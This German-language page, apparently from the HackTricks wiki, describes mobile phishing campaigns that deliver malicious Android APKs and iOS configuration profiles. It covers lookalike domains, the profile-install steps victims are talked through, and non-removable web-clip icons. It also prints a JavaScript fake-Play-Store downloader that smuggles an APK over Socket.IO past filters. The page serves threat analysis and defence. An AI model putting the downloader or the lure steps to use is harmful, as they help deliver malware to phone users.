# Mobile Phishing & Verteilung bösartiger Apps (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, mit denen Angreifer **bösartige Android-APKs** und **iOS-Mobile-Konfigurationsprofile** über Phishing verbreiten (SEO, Social Engineering, gefälschte Stores, Dating-Apps usw.).
> Das Material basiert auf der von Zimperium zLabs aufgedeckten SarangTrap-Kampagne (2025) und weiteren öffentlichen Untersuchungen.<sup>[[1]](#references)</sup>

## Angriffsablauf

1. **SEO-/Phishing-Infrastruktur**
   * Dutzende ähnlich aussehende Domains registrieren (Dating, Cloud-Sharing, Autodienste usw.).  
     – Schlüsselwörter in der Landessprache und Emojis im Element `<title>` verwenden, um das Ranking bei Google zu verbessern.  
     – Sowohl Android-Installationsanweisungen (`.apk`) als auch iOS-Installationsanweisungen auf derselben Landingpage hosten.
2. **Download der ersten Stufe**
   * Android: direkter Link zu einer *nicht signierten* APK oder einer APK aus einem „Drittanbieter-Store“.  
   * iOS: `itms-services://`- oder einfacher HTTPS-Link zu einem bösartigen **mobileconfig**-Profil (siehe unten).
3. **Verhalten nach der Android-Installation**
   * C2-gesteuerte Ausführung, Missbrauch von Berechtigungen, Umgehung von Dropper-Erkennung, Datensammlung im Hintergrund und weiteres Malware-Verhalten nach der Installation werden auf der unten verlinkten Seite zu Android Malware Post-Exploitation behandelt.
4. **iOS-Bereitstellungstechnik**
   * Ein einzelnes **Mobile-Konfigurationsprofil** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` usw. anfordern, um das Gerät einer „MDM“-ähnlichen Verwaltung zu unterstellen.  
   * Anweisungen zum Social Engineering:
     1. Einstellungen öffnen ➜ *Profil geladen*.
     2. Dreimal auf *Installieren* tippen (mit Screenshots auf der Phishing-Seite).  
     3. Dem nicht signierten Profil vertrauen ➜ der Angreifer erhält Berechtigungen für *Kontakte* und *Fotos*, ohne dass eine App-Store-Prüfung stattfindet.
5. **iOS-Web-Clip-Payload (Phishing-App-Symbol)**
   * `com.apple.webClip.managed`-Payloads können eine **Phishing-URL mit einem gebrandeten Symbol und Label auf dem Home-Bildschirm ablegen**.
   * Web Clips können **im Vollbildmodus** ausgeführt werden (blendet die Browseroberfläche aus) und als **nicht entfernbar** markiert werden. Dadurch muss das Opfer das Profil löschen, um das Symbol zu entfernen.<sup>[[3]](#references)</sup>
6. **Netzwerkschicht**
   * Unverschlüsseltes HTTP, häufig über Port 80 mit einem HOST-Header wie `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Android Malware Post-Exploitation

Informationen zu Android-Malware-Techniken nach der Installation, etwa C2, Missbrauch von Accessibility, Overlays, ATS-Automatisierung, stufenweises Laden von DEX-Dateien, Premium-SMS und Persistenz, finden sich hier:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling mit Socket.IO/WebSocket und gefälschte Google-Play-Seiten

Angreifer ersetzen statische APK-Links zunehmend durch einen in Google-Play-Köderseiten eingebetteten Socket.IO/WebSocket-Kanal. Dadurch wird die Payload-URL verschleiert, werden URL- und Erweiterungsfilter umgangen und bleibt die Installationserfahrung realistisch.<sup>[[2]](#references)[[4]](#references)</sup>

Typischer, in freier Wildbahn beobachteter Client-Ablauf:

<details>
<summary>Gefälschter Play-Downloader mit Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Warum einfache Schutzmaßnahmen umgangen werden:
- Es wird keine statische APK-URL offengelegt; die Payload wird im Speicher aus WebSocket-Frames rekonstruiert.
- URL-/MIME-/Erweiterungsfilter, die direkte .apk-Antworten blockieren, übersehen möglicherweise Binärdaten, die über WebSockets/Socket.IO getunnelt werden.
- Crawler und URL-Sandboxes, die WebSockets nicht ausführen, rufen die Payload nicht ab.

Siehe auch WebSocket-Taktiken und -Tools:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Die dunkle Seite der Romantik: SarangTrap-Erpressungskampagne](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Web Clips-Payload-Einstellungen für Apple-Geräte](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banking-Trojaner zielt auf indonesische und vietnamesische Android-Nutzer ab](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
